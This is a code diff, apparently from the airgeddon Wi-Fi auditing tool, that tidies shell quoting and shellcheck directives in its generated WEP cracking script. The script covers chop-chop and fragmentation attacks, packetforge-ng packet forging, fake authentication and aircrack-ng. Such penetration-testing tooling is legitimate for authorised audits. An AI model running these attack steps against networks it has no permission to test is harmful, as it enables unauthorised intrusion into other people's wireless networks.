@@ -3782,7 +3782,7 @@ function set_wep_key_script() {
 
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
 		cat >&8 <<-EOF
-			wep_key_window_pid=\$!
+			wep_key_window_pid="\$!"
 			{
 				echo -e "\${wep_key_window_pid}"
 			} >> "${tmpdir}${wepdir}${wep_processes_file}"
@@ -3865,6 +3865,7 @@ function set_wep_script() {
 		}
 
 		#Function to capture PID of a process started inside tmux and setting it to a global variable
+		#shellcheck disable=SC2009
 		function get_tmux_process_id() {
 
 			local process_pid
@@ -3884,15 +3885,15 @@ function set_wep_script() {
 			fi
 		}
 
-		#shellcheck disable=SC1037,SC2164,SC2140
 		${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
 		mkdir "${tmpdir}${wepdir}" > /dev/null 2>&1
+		#shellcheck disable=SC2164
 		cd "${tmpdir}${wepdir}" > /dev/null 2>&1
 
 		#Execute wep chop-chop attack on its different phases
 		function wep_chopchop_attack() {
 
-			case \${wep_chopchop_phase} in
+			case "\${wep_chopchop_phase}" in
 				1)
 					if grep "Now you can build a packet" "${tmpdir}${wepdir}chopchop_output.txt" > /dev/null 2>&1; then
 						wep_chopchop_phase=2
@@ -3907,10 +3908,10 @@ function set_wep_script() {
 								wep_chopchop_phase1_pid="\${global_process_pid}"
 								global_process_pid=""
 							else
-								wep_chopchop_phase1_pid=\$!
+								wep_chopchop_phase1_pid="\$!"
 							fi
 
-							wep_script_processes+=(\${wep_chopchop_phase1_pid})
+							wep_script_processes+=("\${wep_chopchop_phase1_pid}")
 						fi
 					fi
 				;;
@@ -3919,10 +3920,10 @@ function set_wep_script() {
 					manage_output "-bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" "Chop-Chop Attack (2/3)"
 
 					if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-						wep_chopchop_phase2_pid=\$!
+						wep_chopchop_phase2_pid="\$!"
 					fi
 
-					wep_script_processes+=(\${wep_chopchop_phase2_pid})
+					wep_script_processes+=("\${wep_chopchop_phase2_pid}")
 					wep_chopchop_phase=3
 					;;
 					3)
@@ -3936,7 +3937,7 @@ function set_wep_script() {
 								wep_script_processes+=("\${global_process_pid}")
 								global_process_pid=""
 							else
-								wep_script_processes+=(\$!)
+								wep_script_processes+=("\$!")
 							fi
 
 							wep_chopchop_phase=4
@@ -3949,7 +3950,7 @@ function set_wep_script() {
 		#Execute wep fragmentation attack on its different phases
 		function wep_fragmentation_attack() {
 
-			case \${wep_fragmentation_phase} in
+			case "\${wep_fragmentation_phase}" in
 				1)
 					if grep "Now you can build a packet" "${tmpdir}${wepdir}fragmentation_output.txt" > /dev/null 2>&1; then
 						wep_fragmentation_phase=2
@@ -3964,10 +3965,10 @@ function set_wep_script() {
 								wep_fragmentation_phase1_pid="\${global_process_pid}"
 								global_process_pid=""
 							else
-								wep_fragmentation_phase1_pid=\$!
+								wep_fragmentation_phase1_pid="\$!"
 							fi
 
-							wep_script_processes+=(\${wep_fragmentation_phase1_pid})
+							wep_script_processes+=("\${wep_fragmentation_phase1_pid}")
 						fi
 					fi
 				;;
@@ -3976,11 +3977,11 @@ function set_wep_script() {
 					manage_output "-bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}fragment-\"*.xor -w \"${tmpdir}${wepdir}fragmentation.cap\"" "Fragmentation Attack (2/3)"
 
 					if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-						wep_fragmentation_phase2_pid=\$!
+						wep_fragmentation_phase2_pid="\$!"
 					fi
 
 					wep_fragmentation_phase=3
-					wep_script_processes+=(\${wep_fragmentation_phase2_pid})
+					wep_script_processes+=("\${wep_fragmentation_phase2_pid}")
 				;;
 				3)
 					wep_fragmentation_phase2_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_fragmentation_phase2_pid}$" 2> /dev/null)
@@ -3993,7 +3994,7 @@ function set_wep_script() {
 							wep_script_processes+=("\${global_process_pid}")
 							global_process_pid=""
 						else
-							wep_script_processes+=(\$!)
+							wep_script_processes+=("\$!")
 						fi
 
 						wep_fragmentation_phase=4
@@ -4012,8 +4013,7 @@ function set_wep_script() {
 			path_to_process_file="${tmpdir}${wepdir}${wep_processes_file}"
 
 			for item in "\${wep_script_processes[@]}"; do
-				grep -E "^\${item}$" "\${path_to_process_file}" > /dev/null 2>&1
-				if [ "\$?" != "0" ]; then
+				if ! grep -E "^\${item}$" "\${path_to_process_file}" > /dev/null 2>&1; then
 					echo "\${item}" >> "${tmpdir}${wepdir}${wep_processes_file}"
 				fi
 			done
@@ -4027,10 +4027,10 @@ function set_wep_script() {
 			wep_script_capture_pid="\${global_process_pid}"
 			global_process_pid=""
 		else
-			wep_script_capture_pid=\$!
+			wep_script_capture_pid="\$!"
 		fi
 
-		wep_script_processes+=(\${wep_script_capture_pid})
+		wep_script_processes+=("\${wep_script_capture_pid}")
 		write_wep_processes
 
 		wep_to_be_launched_only_once=0
@@ -4053,10 +4053,10 @@ function set_wep_script() {
 					wep_fakeauth_pid="\${global_process_pid}"
 					global_process_pid=""
 				else
-					wep_fakeauth_pid=\$!
+					wep_fakeauth_pid="\$!"
 				fi
 
-				wep_script_processes+=(\${wep_fakeauth_pid})
+				wep_script_processes+=("\${wep_fakeauth_pid}")
 				write_wep_processes
 				sleep 2
 			fi
@@ -4097,7 +4097,7 @@ function set_wep_script() {
 					wep_script_processes+=("\${global_process_pid}")
 					global_process_pid=""
 				else
-					wep_script_processes+=(\$!)
+					wep_script_processes+=("\$!")
 				fi
 
 				write_wep_processes
@@ -4124,10 +4124,10 @@ function set_wep_script() {
 					wep_aircrack_pid="\${global_process_pid}"
 					global_process_pid=""
 				else
-					wep_aircrack_pid=\$!
+					wep_aircrack_pid="\$!"
 				fi
 
-				wep_script_processes+=(\${wep_aircrack_pid})
+				wep_script_processes+=("\${wep_aircrack_pid}")
 				write_wep_processes
 			fi
 
